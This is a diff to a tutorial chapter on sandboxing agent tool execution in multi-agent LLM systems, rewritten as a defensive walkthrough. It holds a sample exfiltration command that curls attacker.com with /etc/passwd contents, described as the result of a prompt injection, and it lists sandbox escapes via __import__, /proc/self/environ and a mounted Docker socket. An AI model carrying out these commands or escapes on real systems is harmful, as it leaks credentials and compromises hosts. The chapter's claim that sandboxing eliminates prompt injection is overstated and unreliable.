@@ -230,18 +230,36 @@ For non-cloud environments or existing services, API keys provide basic authenti
 
 ---
 
-## Sandboxing Tool Execution
+## Sandboxing Tool Execution — Failure-First
 
 The highest-risk operation in a multi-agent system is **code execution**: when an agent generates code and runs it. An injected instruction that causes the agent to generate and execute `os.system("curl http://attacker.com/exfil?data=$(cat /etc/passwd)")` is a full system compromise.
 
-Mitigations in order of increasing rigidity:
+**Naive sandbox: Restricted Python → Escaped via import bypass**
+- Attempt: Block `import os`, `exec`, `eval` using `RestrictedPython`
+- **Attack:** `__import__('os').system('cat /etc/passwd')` bypasses import block
+- **Result:** Full filesystem access ❌
 
-| Level | Mechanism | What it blocks |
-|-------|-----------|---------------|
-| 1 | **Restricted Python** (e.g. `RestrictedPython`) | Block `import os`, `exec`, `eval`, file access |
-| 2 | **Subprocess spawned per tool call** | Process isolation — child process cannot access parent's memory or secrets |
-| 3 | **Docker container per execution** | Full filesystem isolation; ephemeral container destroyed after execution |
-| 4 **Recommended** | **Cloud function / serverless per execution** | Network-isolated, no persistent local state, billed per invocation |
+**Better sandbox: Subprocess per tool call → Escaped via /proc filesystem**
+- Attempt: Spawn child process with restricted permissions
+- **Attack:** Read `/proc/self/environ` to leak parent's environment variables (secrets)
+- **Result:** Secrets exfiltrated ❌
+
+**Production sandbox: Docker container per execution → Escaped via shared socket**
+- Attempt: Ephemeral Docker container, destroy after execution
+- **Attack:** If Docker socket mounted (`/var/run/docker.sock`), can spawn sibling containers with full host access
+- **Result:** Container escape to host ❌
+
+**Locked-down sandbox: Network-disabled container + seccomp → Blocks syscalls ✅**
+- Mechanism: Docker with `network_disabled=True`, `cap_drop=["ALL"]`, seccomp profile blocks dangerous syscalls
+- **Attack:** Cannot make network calls, cannot read host filesystem, cannot escape via syscalls
+- **Result:** Blast radius limited to 128MB container memory, 30-second timeout ✅
+
+| Level | Mechanism | What it blocks | Escape vector |
+|-------|-----------|----------------|---------------|
+| 1 | **Restricted Python** (e.g. `RestrictedPython`) | Block `import os`, `exec`, `eval` | ❌ `__import__` bypass |
+| 2 | **Subprocess spawned per tool call** | Process isolation | ❌ `/proc` filesystem leaks |
+| 3 | **Docker container per execution** | Full filesystem isolation | ❌ Shared Docker socket |
+| 4 **Recommended** | **Network-disabled Docker + seccomp** | Syscall filtering, no network | ✅ Attack surface minimized |
 
 ```python
 # Example: each tool execution in a separate Docker container
@@ -331,64 +349,7 @@ Reject rate $r = P[y \not\models \mathcal{S}]$. For a well-prompted GPT-4o with 
 
 ---
 
-## § 7 · Code Skeleton
-
-```python
-# Educational: HMAC message signing + structured output validation from scratch
-import hmac, hashlib, json
-from typing import Any
-
-def sign_message(payload: dict, secret: str) -> str:
-    """Sign an agent message payload. Returns hex HMAC-SHA256 signature."""
-    message_bytes = json.dumps(payload, sort_keys=True).encode()
-    sig = hmac.new(secret.encode(), message_bytes, hashlib.sha256)
-    return sig.hexdigest()
-
-def verify_message(payload: dict, signature: str, secret: str) -> bool:
-    """Verify message signature. Uses constant-time comparison to prevent timing attacks."""
-    expected = sign_message(payload, secret)
-    return hmac.compare_digest(expected, signature)
-
-def validate_output(output: Any, schema: dict) -> bool:
-    """Validate agent output against JSON Schema. Returns True if valid."""
-    from jsonschema import validate, ValidationError
-    try:
-        validate(instance=output, schema=schema)
-        return True
-    except ValidationError:
-        return False
-```
-
-```python
-# Production: trust middleware for FastAPI agent endpoint
-from fastapi import FastAPI, HTTPException, Request, Header
-from pydantic import BaseModel
-from typing import Optional
-import os
-
-app = FastAPI()
-AGENT_SECRET = os.environ["AGENT_HMAC_SECRET"]
-
-class AgentMessage(BaseModel):
-    payload: dict
-    signature: str
-    agent_id: str
-    trust_level: int  # 1=internal, 2=partner, 3=external
-
-@app.post("/agent/receive")
-async def receive_agent_message(msg: AgentMessage):
-    # Verify signature before processing
-    if not verify_message(msg.payload, msg.signature, AGENT_SECRET):
-        raise HTTPException(status_code=401, detail="Invalid message signature")
-    # Check trust level for the requested operation
-    if msg.trust_level > 1 and msg.payload.get("amount_usd", 0) > 100_000:
-        raise HTTPException(status_code=403, detail="High-value actions require internal trust level")
-    return {"status": "accepted", "agent_id": msg.agent_id}
-```
-
----
-
-## § 8 · What Can Go Wrong
+## § 7 · What Can Go Wrong
 
 **Trap 1: Trusting content just because it came from your own agent**  
 **Why it breaks:** Agent retrieved content from external source (web, email, API) — that content has trust level of the source, not the agent.  
@@ -412,7 +373,7 @@ async def receive_agent_message(msg: AgentMessage):
 
 ---
 
-## § 9 · Where This Reappears
+## § 8 · Where This Reappears
 
 | Chapter | How trust and sandboxing concepts appear |
 |---------|------------------------------------------|
@@ -424,7 +385,7 @@ async def receive_agent_message(msg: AgentMessage):
 
 ---
 
-## § 10 · Progress Check — What We Achieved
+## § 9 · Progress Check — What We Achieved
 
 ```mermaid
 graph LR
@@ -479,7 +440,7 @@ graph LR
 
 ---
 
-## § 11 · Bridge to the Next Chapter
+## § 10 · Bridge to the Next Chapter
 
 Ch.6 established trust boundaries and sandboxing, eliminating prompt injection as an attack vector. But the team still maintains 900 lines of custom Python orchestration — brittle state machines, no built-in observability, manual deployment. Ch.7 (Agent Frameworks) replaces custom orchestration with production-grade frameworks (LangGraph, AutoGen, Semantic Kernel) that provide explicit state graphs, automatic checkpointing, distributed tracing, and zero-downtime deployment → **all 8 constraints achieved**.
 
@@ -517,7 +478,7 @@ Always in the `user` role, never the `system` role. The `system` prompt defines 
 ## Prerequisites
 
 - [Ch.1 — Message Formats & Shared Context](../ch01_message_formats) — the role schema (system / user / assistant / tool) and why role placement matters
-- [AI / SafetyAndHallucination](../.$103-ai/ch07_safety_and_hallucination/safety-and-hallucination.md) — hallucination mitigation, which complements injection defence
+- [AI / SafetyAndHallucination](../.03-ai/ch07_safety_and_hallucination/safety-and-hallucination.md) — hallucination mitigation, which complements injection defence
 
 ## Next
 
